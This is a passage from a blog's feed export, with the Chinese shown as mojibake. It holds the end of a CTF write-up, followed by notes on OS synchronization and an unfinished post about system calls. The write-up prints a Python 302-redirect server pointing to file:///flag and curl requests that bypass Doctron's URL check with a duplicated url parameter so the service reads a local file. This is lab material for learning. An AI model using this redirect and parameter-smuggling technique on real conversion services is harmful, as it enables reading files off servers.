class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Received request from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Responding with 302 redirect to file:///flag&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">302</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;file:///flag&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = <span class="number">8000</span></span><br><span class="line">    server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, port)</span><br><span class="line">    httpd = HTTPServer(server_address, RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Starting redirect server on port <span class="subst">&#123;port&#125;</span>...&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] Stopping server.&quot;</span>)</span><br><span class="line">        httpd.server_close()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>å°è¯•è°ƒç”¨ <code>/convert/html2pdf</code> æˆ– <code>/convert/html2image</code>ï¼Œ<code>url</code> å‚æ•°æŒ‡å‘æœ¬åœ°è·³è½¬æœåŠ¡å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;url=http://172.17.0.1:8000/&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¬¡è¯·æ±‚æˆåŠŸç»•è¿‡äº† <code>CheckParams</code> çš„åè®®æ ¡éªŒï¼ŒDoctron é€šè¿‡ <code>chromedp</code> æˆ– <code>pkg/curl</code> è®¿é—®äº†è·³è½¬ URLï¼Œå¹¶æˆåŠŸè¯»å–äº† <code>/flag</code> æ–‡ä»¶å†…å®¹ã€‚ç„¶è€Œï¼Œå°† <code>/flag</code> çš„çº¯æ–‡æœ¬å†…å®¹è½¬æ¢ä¸º PDF æˆ–å›¾ç‰‡æ—¶ï¼Œè¾“å‡ºæ–‡ä»¶ï¼ˆPDF æˆ– PNGï¼‰æ˜¯ç©ºç™½çš„æˆ–æŸåçš„ã€‚å°è¯• <code>/convert/pdfAddWatermark</code> å¹¶å°† <code>/flag</code> ä½œä¸ºå›¾ç‰‡æˆ– PDF æºåŠ è½½æ—¶ï¼Œå¯¼è‡´ worker ä»»åŠ¡è¶…æ—¶ (30 ç§’)ã€‚è¿™äº›ç»“æœè¡¨æ˜ Doctron çš„è½¬æ¢/è§£æåº“æ— æ³•æ­£ç¡®å¤„ç†çº¯æ–‡æœ¬è¾“å…¥ï¼Œå¹¶ä¸”é”™è¯¯ä¿¡æ¯è¢«å±è”½ã€‚<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/doctron_faild.png" alt="doctron_faild.png"></p><p>æœ€åæ ¹æ®å…³é”®Hintï¼šâ€œé—®é¢˜ä¸åœ¨äºç”Ÿæˆ pdf æˆ–æµè§ˆå™¨æ¸²æŸ“ï¼›golang ä¸­å¯ä»¥ç»•è¿‡ CheckParams å‡½æ•°å»ä½¿ç”¨ file åè®®è¯»æ–‡ä»¶â€ã€‚è¿™ä¸ªæç¤ºçº æ­£äº†ä¹‹å‰å¯¹æ¸²æŸ“é—®é¢˜çš„å…³æ³¨ï¼Œå¹¶æ˜ç¡®æŒ‡å‡ºå¯ä»¥ç»•è¿‡ <code>CheckParams</code> ç›´æ¥ä½¿ç”¨ <code>file://</code>ã€‚</p><p>é€šè¿‡é‡æ–°åˆ†æ <code>params.go</code>ï¼Œ<code>CheckParams</code> è·å–åä¸º <code>&quot;url&quot;</code> çš„å‚æ•°ï¼Œç„¶åæ ¡éªŒå…¶åè®®ã€‚æç¤ºâ€œç»•è¿‡ CheckParams å‡½æ•°â€å¼ºçƒˆæš—ç¤ºï¼Œå­˜åœ¨ä¸€ç§æ–¹æ³•æä¾›ä¸€ä¸ª URLï¼Œå®ƒèƒ½è¢« Doctron åç»­ä»£ç è¯†åˆ«ä¸ºæº URLï¼Œä½†å´ç»•è¿‡äº† <code>CheckParams</code> å¯¹ <code>&quot;url&quot;</code> å‚æ•°çš„æ ¡éªŒã€‚æœ€å¯èƒ½çš„ç»•è¿‡æ–¹æ³•æ˜¯<strong>é‡å¤å‚æ•°</strong>ã€‚å‡è®¾ <code>CheckParams</code> ä¸­çš„ <code>ctx.URLParam(&quot;url&quot;)</code> è·å–çš„æ˜¯ç¬¬ä¸€ä¸ªåŒåå‚æ•°çš„å€¼ï¼Œè€Œ Doctron åç»­çš„å‚æ•°ç»‘å®šæœºåˆ¶è·å–çš„æ˜¯æœ€åä¸€ä¸ªã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2image?u=doctron&amp;p=lampnick&amp;url=http://example.com&amp;url=file:///flag&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¬¡å°è¯•è¿”å›äº† <code>HTTP/1.1 200 OK</code>ï¼Œ<code>Content-Type: image/png</code>ï¼Œå¹¶å¼€å§‹è¿›è¡Œåˆ†å—ç¼–ç ä¼ è¾“ï¼Œä½†æœ€ç»ˆä¼ è¾“å¤±è´¥ã€‚è¿™è¯æ˜<strong>é‡å¤å‚æ•°æˆåŠŸç»•è¿‡äº† <code>CheckParams</code> çš„åè®®æ ¡éªŒ</strong>ï¼ŒDoctron æˆåŠŸè¯»å–äº† <code>/flag</code> æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°è¯•è¿›è¡Œå›¾ç‰‡è½¬æ¢ï¼</p><p>ç ´æŸä¸è¦ç´§ï¼Œæˆ‘ä»¬å…ˆä¿å­˜ä¸‹æ¥çœ‹çœ‹ï¼Ÿ<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/doctron_succeed.png" alt="doctron_succeed.png"></p><h1 id="w4terctf-2025-æ€»ç»“"><a class="markdownIt-Anchor" href="#w4terctf-2025-æ€»ç»“"></a> W4terCTF 2025 æ€»ç»“</h1><p>28å·å¼€å§‹çš„æ¯”èµ›ï¼Œå†æ—¶ä¸€å‘¨ï¼Œç»ˆäºåœ¨äº”ä¸€å‡æœŸçš„æœ«å°¾ç»“æŸäº†ï¼ä¸€å¼€å§‹åªæƒ³ç€åšå‡ é“ç­¾åˆ°é¢˜æ„Ÿå—ä¸€ä¸‹ä»€ä¹ˆæ˜¯ CTF ï¼Œæ²¡æƒ³åˆ°é˜Ÿå‹å‘æŒ¥å¼ºåŠ²ï¼Œæˆ‘ä¹Ÿåœ¨å¼ºçƒˆçš„â€œæ­£åé¦ˆâ€ä¸‹ï¼Œç›´æ¥æŠŠæ‰€æœ‰æ—¶é—´éƒ½æŠ•å…¥äº†è¿›å»ã€‚éå¸¸éå¸¸é«˜å…´æˆ‘ä»¬ Team Nooob èƒ½åœ¨æ ¡èµ›ä¸Šæ‹¿ä¸‹å‰åï¼ï¼ï¼ï¼ï¼ï¼ï¼<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/ranking.png" alt="ranking.png"><br><img src="/2025/04/28/SYSU%20W4terCTF%202025/curve.png" alt="curve.png"></p><p>ä½œä¸ºåè¶³çš„æ–°æ‰‹ï¼Œåœ¨è¿™æ¬¡çš„æ ¡èµ›ä¸­æ”¶è·é¢‡ä¸°ã€‚å°è±¡æœ€æ·±çš„æ˜¯ WMC25 çš„ä¸‰é“é¢˜ç›®ï¼Œä»æœ€å¼€å§‹çš„æ ˆæº¢å‡ºï¼Œåˆ°æƒ³åŠæ³•è·å¾— Canary å€¼å¹¶ç»•è¿‡ï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°ï¼Œå†åˆ°å¼€å¯ PIE éšæœºåŠ è½½åœ°å€ï¼Œå°è¯•è·å¾— Libc åŸºå€å®ç° ret2libcï¼Œå†æœ€åæ„é€ ç²¾å·§çš„ ROP è°ƒç”¨é“¾ï¼Œå®ç°è°ƒç”¨ä¸€ä¸ªâ€œä»æœªå‡ºç°è¿‡â€çš„å‡½æ•°ï¼è¿™ä¸€åˆ‡å›æƒ³èµ·æ¥è¿˜æ˜¯ä»¤äººæ¿€åŠ¨ä¸å·²ï¼Œè™½ç„¶è¿™äº›éƒ½æ˜¯ CTF æœ€åŸºç¡€çš„å†…å®¹ï¼Œä½†æ˜¯äº²æ‰‹å®è·µå¹¶ä¸€æ­¥æ­¥æ”»å…‹éš¾ç‚¹çš„è¿‡ç¨‹å¯¹äºæ–°æ‰‹çš„æˆ‘æ¥è¯´æ˜¯å®è´µçš„ç»éªŒã€‚</p><p>ä¸ç•æµ®äº‘é®æœ›çœ¼ï¼Œåœ¨å¤§ä½¬äº‘é›†çš„æ ¡èµ›æ‹¿ä¸‹å¦‚æ­¤æˆç»©å®åœ¨å¾—æ„Ÿè°¢é˜Ÿå‹ä»¬çš„ä»˜å‡ºã€‚é‚£ä¹ˆï¼Œæ˜å¹´å†ä¼šï¼Œé‚£æ—¶å€™çš„æˆ‘ä¼šæ›´åŠ å¼ºå¤§ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Hack for fun not for profit_&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯æˆ‘åœ¨ Team Nooob é˜Ÿä¼ä¸­è´Ÿè´£çš„é¢˜ç›®ã€‚&lt;/p&gt;
&lt;h1 id=&quot;ç­¾åˆ°é—®å·&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Synchronization</title>
    <link href="http://example.com/2025/04/20/Operating-System-Concepts-Ch6/"/>
    <id>http://example.com/2025/04/20/Operating-System-Concepts-Ch6/</id>
    <published>2025-04-20T06:12:39.233Z</published>
    <updated>2025-04-20T06:13:50.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="concurrence-control"><a class="markdownIt-Anchor" href="#concurrence-control"></a> Concurrence Control</h1><p><strong><em>Multiprogramming</em></strong> introduces the possibility of <strong><em>concurrent</em></strong> execution, and if concurrent execution is not properly managed in terms of accessing shared resources (process communication), it can lead to <strong><em>race conditions</em></strong>. To avoid race conditions, <strong><em>synchronization</em></strong> mechanisms such as locks or semaphores are required. However, if these mechanisms are used improperly (e.g., inconsistent lock acquisition order), they may result in <strong><em>deadlock</em></strong>.</p><h2 id="mutual-exclution-synchronization"><a class="markdownIt-Anchor" href="#mutual-exclution-synchronization"></a> Mutual Exclution &amp; Synchronization</h2><p>Mutual exclusion and synchronization are two of the requirements in concurrent program.</p><ul><li>Different threads share the same resource, so we need <em>mutual exclusion</em> to concurrently <strong>control in sapce</strong>.</li><li>Different threads may rely on other threads, so we need to <em>synchronizaztion</em> to concurrently <strong>control in timing sequence</strong>.</li></ul><p>For example, in the <strong>producer-consumer problem</strong>:</p><ul><li><strong>Mutual Exclusion</strong> (Space): Protects access to the shared buffer using a mutex.</li><li><strong>Synchronization</strong> (Timing): Ensures the producer waits if the buffer is full and the consumer waits if the buffer is empty, so they operate in the correct sequence.</li></ul><h1 id="mechanisms"><a class="markdownIt-Anchor" href="#mechanisms"></a> Mechanisms</h1><h2 id="mutual-exclusion-spin-lock-mutex-lock"><a class="markdownIt-Anchor" href="#mutual-exclusion-spin-lock-mutex-lock"></a> Mutual Exclusion: Spin lock &amp; Mutex lock</h2><p><strong>A spinlock is a synchronization primitive that usesÂ <a href="https://www.baeldung.com/cs/os-busy-waiting">busy-waiting</a></strong>. When a thread attempts to acquire a spinlock that another thread already holds, it continuously checks the lock in a loop (spins) until the lock becomes available, which is non-blocking.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Spin lock</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spinlock_lock</span><span class="params">(<span class="type">spinlock_t</span> *s)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (atomic_exchange(&amp;s-&gt;lock, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// busy-waiting</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spinlock_unlock</span><span class="params">(<span class="type">spinlock_t</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;s-&gt;lock, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>A mutex is a mechanism that locks critical sections of code and only allows one thread to acquire the lock and use the resources at a time</strong>. If another thread tries to run the critical section while itâ€™s locked, the OS puts this thread to sleep, which is blocking:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mutex lcok</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Mutex_Lock</span><span class="params">(Mutex* mutex)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (atomic_exchange(&amp;mutex-&gt;state, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Add current thread to waiting queue</span></span><br><span class="line">        Queue_Enqueue(&amp;mutex-&gt;waiting_queue, current_thread);</span><br><span class="line">Thread_Block(current_thread);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Mutex_Unlock</span><span class="params">(Mutex* mutex)</span> &#123;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;mutex-&gt;state, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// signal()</span></span><br><span class="line">    <span class="keyword">if</span> (!Queue_IsEmpty(&amp;mutex-&gt;waiting_queue)) &#123;</span><br><span class="line">        Thread* next_thread = Queue_Dequeue(&amp;mutex-&gt;waiting_queue);</span><br><span class="line">        Thread_Unblock(next_thread);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When it comes to performance,Â <strong>mutexes involve context switches, which can introduce significant overhead, especially if the critical section is short</strong>. This overhead arises because the operating system needs to put the thread to sleep and later wake it up.</p><p>In contrast,Â <strong>spinlocks donâ€™t use context switches. Therefore, they are faster for short critical sections,</strong>Â but this speed comes at the cost of potentially wasting CPU cycles if the wait time for the lock to become available is longer.</p><h2 id="synchronizaion-semaphore-condition-variable"><a class="markdownIt-Anchor" href="#synchronizaion-semaphore-condition-variable"></a> Synchronizaion: Semaphore &amp; Condition Variable</h2><p><strong><em>Semaphore</em> is more powerful in terms of functionality</strong>:</p><ul><li>It can <strong>achieve both mutual exclusion and synchronization</strong>.</li><li>A <strong>binary semaphore</strong> (initialized to 1) acts like a <strong>mutex</strong> to enforce <strong>mutual exclusion</strong>.</li><li>A <strong>counting semaphore</strong> (initialized to N) allows up to <strong>N threads</strong> to access a resource concurrently.</li><li>Semaphores inherently track state (e.g., counting mechanism), so <strong>signals are not lost</strong> if no thread is currently waiting.</li></ul><p><strong><em>Condition variable</em> is more expressive for certain synchronization patterns</strong>:</p><ul><li>Itâ€™s <strong>purely for synchronization</strong>, meaning it does not provide mutual exclusion on its own.</li><li>It requires an <strong>explicit lock (mutex)</strong> to protect shared data.</li><li>It is <strong>more suitable for event-based synchronization</strong> (e.g., producer-consumer, where a thread waits until a condition is met).</li><li>Unlike semaphores, if a condition variable is signaled <strong>before a thread starts waiting, the signal is lost</strong>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Templet of using condition vaiable</span></span><br><span class="line">mutex_lock(&amp;lk);</span><br><span class="line"><span class="keyword">while</span> (!CONDITION) &#123;</span><br><span class="line">cond_wait(&amp;lk, &amp;cond_var)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* critical section */</span></span><br><span class="line"></span><br><span class="line">cond_signal(&amp;lk, &amp;cond_var)</span><br><span class="line"><span class="comment">// or cond_broadcast()</span></span><br><span class="line">mutex_unlock(&amp;lk);</span><br></pre></td></tr></table></figure><p>Semaphores are lower-level and more flexible but trickier to use correctly. Condition variables make synchronization easier to reason about when dealing with complex thread interactions. If you misuse semaphores, you risk deadlocks or priority inversions. If you misuse condition variables, you risk lost signals and unexpected hangs.</p><h1 id="synchronization-problems"><a class="markdownIt-Anchor" href="#synchronization-problems"></a> Synchronization Problems</h1><h2 id="1-producers-consumers-problem"><a class="markdownIt-Anchor" href="#1-producers-consumers-problem"></a> 1. Producers-Consumers Problem</h2><p>This classic synchronization problem consists of two types of processes: producer and consumer.</p><ul><li><strong>Producer</strong>: Generates data and places it into a shared bounded buffer (mutual exclusion) <strong>only if itâ€™s not full</strong> (synchronization).</li><li><strong>Consumer</strong>: Retrieves data from the buffer for processing <strong>only if itâ€™s not empty.</strong></li></ul><h2 id="2-readers-writers-problem"><a class="markdownIt-Anchor" href="#2-readers-writers-problem"></a> 2. Readers-Writers Problem</h2><p>Different from producers-consumers problem, we distinguish between two types of processes: <strong><em>readers</em></strong>, which may want only to read the shared data; <strong><em>writers</em></strong>, which may update (to read and write) the shared data. While a reader is reading, other readers can read the shared data simultaneously because the data wonâ€™t change. However, when a writer is updating the data, no other process, including readers and writers, can access the shared data.</p><p>This problems have some variations, all involving priorities:</p><ul><li>No readers be kept waiting unless a writer has already obtained the lock --&gt; <strong>writers starvation</strong></li><li>Writer perform its write as soon as possible once it is ready --&gt; <strong>readers starvation</strong></li></ul><p>The readers-writer problem and its solutions can be generalized to <strong>reader-writer lock</strong>, which have read and write modes. Acquiring a reader-writer lock requires specifying the mode of the lock: <em>read</em> or <em>write</em> access.</p><p>Reader-Writer lock is suitable for some situations where reading is performed frequently while writing is in low frequency:</p><ol><li><strong>Caching system</strong>: data will be frequently read but only be wrote when caching expires or data updating</li><li><strong>Configuration management</strong>: configuration data will be frequently read simultaneously by several threads but only when configuration updating, writing happens</li></ol><h2 id="3-dining-philosophers-problem"><a class="markdownIt-Anchor" href="#3-dining-philosophers-problem"></a> 3. Dining-Philosophers Problem</h2><p>TODO</p><hr><p><strong>Reference:</strong></p><ul><li>DeepSeek</li><li><em>Operating System Concepts, 9th edition</em></li><li><a href="https://segmentfault.com/a/1190000039844055">ã€æ“ä½œç³»ç»Ÿâ€”å¹¶å‘ã€‘æ¡ä»¶å˜é‡ä¸ä¿¡å·é‡ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦</a></li><li><a href="https://jyywiki.cn/OS/2024/lect10.md">Yanyanâ€™s Wiki</a></li><li><a href="https://www.baeldung.com/cs/mutex-vs-spinlock-concurrent-parallel-distributed-programming">https://www.baeldung.com/cs/mutex-vs-spinlock-concurrent-parallel-distributed-programming</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;concurrence-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#concurrence-control&quot;&gt;&lt;/a&gt; Concurrence Control&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Multiprog</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ä¸ºä»€ä¹ˆåº”ç”¨ç¨‹åºåªèƒ½åœ¨ç‰¹å®šçš„æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œ</title>
    <link href="http://example.com/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/"/>
    <id>http://example.com/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/</id>
    <published>2025-04-15T13:55:02.487Z</published>
    <updated>2025-05-19T13:42:56.387Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹è§†é¢‘çœ‹åˆ°äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼š<a href="https://www.youtube.com/watch?v=eP_P4KOjwhs">Why applications are operating-system specific?</a></p><h1 id="è§‚ç‚¹çœ‹æ³•"><a class="markdownIt-Anchor" href="#è§‚ç‚¹çœ‹æ³•"></a> è§‚ç‚¹çœ‹æ³•</h1><p>å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘çš„èƒ½æƒ³åˆ°ç­”æ¡ˆä¾¿æ˜¯ syscalls ã€‚å°½ç®¡æœºå™¨çš„æ¶æ„å¯èƒ½æ˜¯ç›¸åŒçš„ï¼ˆå³åº”ç”¨ç¨‹åºè¢«ç¼–è¯‘ä¸ºåŒä¸€æŒ‡ä»¤é›†ï¼‰ï¼Œä½†åº”ç”¨å¹¶éç›´æ¥ä¸ç¡¬ä»¶äº¤äº’ï¼Œå®ƒä»¬ä¹‹é—´å­˜åœ¨äº†ä¸€ä¸ªä¸­é—´å±‚â€”â€”æ“ä½œç³»ç»Ÿã€‚åº”ç”¨åœ¨ user mode ä¸‹åªèƒ½æ‰§è¡Œæœ‰é™çš„è®¡ç®—æŒ‡ä»¤ï¼Œè€Œä¸ºäº†ä½¿ç”¨ I/O è®¾å¤‡ã€å†…å­˜ã€æ–‡ä»¶ç³»ç»Ÿç­‰è½¯ç¡¬ä»¶èµ„æºï¼Œå¿…é¡»è°ƒç”¨ OS æä¾›ç»™ç”¨æˆ·çš„ APIï¼Œå³ system callsï¼Œå°†æ§åˆ¶è½¬ç§»ç»™ OSï¼ŒCPU åˆ‡æ¢ä¸º kernel modeï¼Œæ‰§è¡Œå†™æ­»çš„ syscall å†…æ ¸ä»£ç å¹¶è¿”å›ç»“æœç»™åº”ç”¨ã€‚</p><p>ä¸åŒæ“ä½œç³»ç»Ÿæä¾›çš„ syscalls æœ‰å¾ˆå¤§çš„ä¸åŒã€‚ä»¥ Windows å’Œ Unix/Linux çš„åˆ›å»ºè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ä¸ºä¾‹ï¼š</p><ul><li>åœ¨ Win çš„ API ä¸‹ï¼Œè¿›ç¨‹è°ƒç”¨<code>CreateProcess()</code>åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ‰§è¡ŒæŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶</li><li>Unix/Linux ä¸‹ï¼Œè¿›ç¨‹è°ƒç”¨<code>fork()</code>ä»…å¤åˆ¶äº†è¿›ç¨‹æœ¬èº«ï¼Œä¸ºäº†åŠ è½½æ‰§è¡Œç¨‹åºè¿˜éœ€è°ƒç”¨<code>exec()</code></li></ul><p>å®ç°çš„ä¸åŒå¯¼è‡´ syscall çš„è¡Œä¸ºä¸åŒï¼Œä¹Ÿå°±æ— æ³•å®ç°åº”ç”¨ç¨‹åºçš„è·¨å¹³å°äº†ã€‚æ‰€ä»¥åŒä¸€æ®µä»£ç é€»è¾‘ï¼Œåœ¨ç¼–ç¨‹è¯­è¨€å±‚é¢çš„ç¼–å†™å°±æœ‰å¾ˆå¤§ä¸åŒäº†ï¼Œç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç é‚£ä¹ˆå°±ä¼šæœ‰æ›´å¤§çš„ä¸åŒï¼</p><hr><p>åœ¨æ€»ç»“è§†é¢‘å†…å®¹çš„åŸºç¡€ä¹‹ä¸Šï¼Œè¯¦ç»†è¡¥å……åœ¨ <em>Operating System Concepts</em> ç« èŠ‚ç¬”è®°ä¸­ç¼ºå¤±çš„ä¸€äº›æ¦‚å¿µå¹¶åœ¨æ­¤ä¹‹ä¸Šå»¶ç”³å‡ºä¸€äº›æ€è€ƒï¼š</p><ul><li>ç³»ç»Ÿè°ƒç”¨ system calls<ul><li>Shell çš„æ„å»º</li><li>x86 <code>syscall</code>æŒ‡ä»¤ï¼šHardware-based context switch v.s. Software-based context switch</li></ul></li><li>ABI (Application Binary Interface)</li></ul><hr><h1 id="1-ç³»ç»Ÿè°ƒç”¨-system-call"><a class="markdownIt-Anchor" href="#1-ç³»ç»Ÿè°ƒç”¨-system-call"></a> 1. ç³»ç»Ÿè°ƒç”¨ System Call</h1><p>ä¸Šé¢è¯´äº†æˆ‘å¯¹ syscall çš„æ€è€ƒï¼Œå®é™…ä¸Šï¼Œå°±ç®—ä¸åŒæ“ä½œç³»ç»Ÿå¯¹åŒä¸€ç³»ç»Ÿè°ƒç”¨çš„æ¥å£ä¸å®ç°ç›¸åŒï¼Œä½†<strong>åº•å±‚å®ç°çš„ç»†èŠ‚</strong>ä¾æ—§ä¼šå¯¼è‡´åº”ç”¨æ— æ³•è·¨å¹³å°è¿è¡Œã€‚</p><h2 id="ç³»ç»Ÿè°ƒç”¨è¡¨-system-call-table"><a class="markdownIt-Anchor" href="#ç³»ç»Ÿè°ƒç”¨è¡¨-system-call-table"></a> ç³»ç»Ÿè°ƒç”¨è¡¨ System Call Table</h2><p>é¦–å…ˆè¡¥å……ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ä¸€äº›çŸ¥è¯†ç‚¹ï¼š<strong>Hardware-based context switch v.s. Software-based context switch</strong></p><p>æŠ¢å å¼è°ƒåº¦ä¾èµ–ä¸­æ–­å®ç°ï¼Œå…¶ä¸­æ—¶é—´ç‰‡è½®è½¬ï¼ˆRound Robinï¼‰ä¾èµ–æ—¶é’Ÿä¸­æ–­å®ç°ï¼ŒCPU å“åº”ä¸­æ–­ä¼šè¿›è¡Œè¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä¿å­˜å½“å‰è¿›ç¨‹çš„æ‰€æœ‰<strong>çŠ¶æ€</strong>åˆ° PCB ä¸­ï¼Œå†ä» PCB åŠ è½½æ–°è¿›ç¨‹çš„<strong>çŠ¶æ€</strong>ã€‚</p><p>system call ä¹Ÿä¼šä½¿ CPU ä»ç”¨æˆ·æ€è½¬æ¢ä¸ºå†…æ ¸æ€ï¼Œä¸ºäº†æ‰§è¡Œåœ¨æ“ä½œç³»ç»Ÿå†…æ ¸ä»£ç ä¸­å†™å®šçš„ç³»ç»Ÿè°ƒç”¨ä¾‹ç¨‹ï¼ŒCPU åŒæ ·éœ€è¦è¿›è¡Œä¸Šä¸‹æ–‡çš„åˆ‡æ¢ï¼Œä½†è¿™ä¸ªè¿‡ç¨‹åªä¿ç•™ä¸€äº›å¿…è¦çš„å¯„å­˜å™¨å€¼ï¼Œå› ä¸ºæœ¬è´¨ä¸Šè¿˜æ˜¯åœ¨æ‰§è¡Œè¿™ä¸ªè¿›ç¨‹ã€‚è‡³å°‘éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨æœ‰ï¼š</p><ul><li>Program Counter (<code>PC</code>) / <code>%rip</code></li><li>Stack Pointer (<code>%rsp</code>) åˆ‡æ¢ä¸ºå†…æ ¸æ ˆ</li><li>æ ‡å¿—å¯„å­˜å™¨</li><li>syscall ä¼ å‚æ‰€å 